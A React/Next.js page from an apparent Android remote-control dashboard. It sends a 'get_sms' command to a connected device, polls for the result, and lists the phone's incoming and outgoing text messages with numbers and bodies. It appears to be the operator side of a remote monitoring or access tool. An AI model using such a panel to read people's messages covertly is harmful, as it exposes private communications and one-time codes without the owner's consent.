'use client'
import { Suspense, useEffect } from 'react'
import { useState } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { useBadge } from '@/contexts/BadgeContext'
import { MessageSquare, RefreshCw, Circle, Download } from 'lucide-react'

interface SmsEntry { date: string; type: string; number: string; body: string }

function parseSms(text: string): SmsEntry[] {
  const lines = text.split('\n').filter(l =>
    l.trim() && !l.startsWith('===') && !l.startsWith('Total') && !l.startsWith('No SMS')
  )
  return lines.map(line => {
    // Format: [MM-dd HH:mm][▼IN] +628xxx: isi pesan
    const m = line.match(/^\[([^\]]+)\]\[([^\]]+)\]\s*([^:]+):\s*(.*)$/)
    if (m) return { date: m[1], type: m[2], number: m[3].trim(), body: m[4].trim() }
    return { date: '', type: '', number: '', body: '' }
  }).filter(e => e.date)
}

async function smartPoll(
  deviceId: string,
  cmdPrefix: string,
  sentAt: number,
  maxAttempts = 20,
  intervalMs = 800
): Promise<string | null> {
  for (let i = 0; i < maxAttempts; i++) {
    await new Promise(r => setTimeout(r, i === 0 ? 1200 : intervalMs))
    const r = await fetch(`/api/device/result?deviceId=${deviceId}`)
    const d = await r.json()
    const match = (d.history ?? [])
      .filter((h: { command: string; result: string; timestamp: string }) =>
        h.command.startsWith(cmdPrefix) && new Date(h.timestamp).getTime() > sentAt - 500)
      .sort((a: { timestamp: string }, b: { timestamp: string }) =>
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
    if (match?.result) return match.result as string
  }
  return null
}

function SmsContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const { notifySmsCount, clearSmsBadge } = useBadge()
  const [entries, setEntries] = useState<SmsEntry[]>([])
  const [loading, setLoading] = useState(false)
  const [limit, setLimit] = useState('50')

  useEffect(() => { clearSmsBadge() }, [clearSmsBadge])

  const fetchSms = async () => {
    if (!selectedId) return
    setLoading(true)
    try {
      const sentAt = Date.now()
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: `get_sms:${limit}` }),
      })
      const result = await smartPoll(selectedId, 'get_sms', sentAt)
      if (result) {
        const parsed = parseSms(result)
        setEntries(parsed)
        notifySmsCount(parsed.length)
        clearSmsBadge()
      }
    } finally { setLoading(false) }
  }

  const typeColor = (type: string) =>
    type.includes('IN') ? 'bg-android-green/10 text-android-green' : 'bg-android-blue/10 text-android-blue'

  const typeLabel = (type: string) =>
    type.includes('IN') ? '▼ IN' : '▲ OUT'

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-4xl mx-auto px-3 md:px-6 py-4 md:py-6">

          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2">
                <MessageSquare size={20} className="text-android-green" />
                SMS Messages
              </h2>
              <p className="text-android-muted text-xs mt-0.5">
                Baca langsung dari database SMS perangkat via ContentResolver
              </p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${
              connected
                ? 'text-android-green border-android-green/30 bg-android-green/10'
                : 'text-android-red border-android-red/30 bg-android-red/10'
            }`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
              {connected ? 'Online' : 'Offline'}
            </div>
          </div>

          {/* Controls */}
          <div className="flex gap-2 mb-4 flex-wrap">
            <select
              value={limit}
              onChange={e => setLimit(e.target.value)}
              className="px-3 py-2 bg-android-surface border border-android-border rounded-lg text-android-text text-sm focus:outline-none focus:border-android-green"
            >
              <option value="20">Last 20</option>
              <option value="50">Last 50</option>
              <option value="100">Last 100</option>
              <option value="200">Last 200</option>
            </select>
            <button
              onClick={fetchSms}
              disabled={!connected || loading}
              className="flex items-center gap-2 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed"
            >
              {loading ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
              {loading ? 'Fetching…' : 'Fetch SMS'}
            </button>
          </div>

          {!connected && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <MessageSquare size={32} className="mx-auto mb-3 text-android-border" />
              Connect a device to view SMS
            </div>
          )}

          {connected && entries.length === 0 && !loading && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <MessageSquare size={32} className="mx-auto mb-3 text-android-border" />
              <p>Klik &quot;Fetch SMS&quot; untuk ambil data SMS dari perangkat</p>
            </div>
          )}

          {entries.length > 0 && (
            <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden">
              <div className="px-4 py-2.5 border-b border-android-border text-xs text-android-muted">
                {entries.length} pesan
              </div>
              <div className="divide-y divide-android-border/50">
                {entries.map((e, i) => (
                  <div key={i} className="flex gap-3 px-4 py-3 hover:bg-white/5">
                    <div className="shrink-0 pt-0.5">
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded ${typeColor(e.type)}`}>
                        {typeLabel(e.type)}
                      </span>
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between mb-1 gap-2">
                        <span className="text-android-text text-sm font-semibold font-mono truncate">
                          {e.number}
                        </span>
                        <span className="text-android-muted text-[10px] shrink-0">{e.date}</span>
                      </div>
                      <p className="text-android-muted text-sm break-words">{e.body}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

        </div>
      </main>
    </div>
  )
}

export default function SmsPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <SmsContent />
    </Suspense>
  )
}
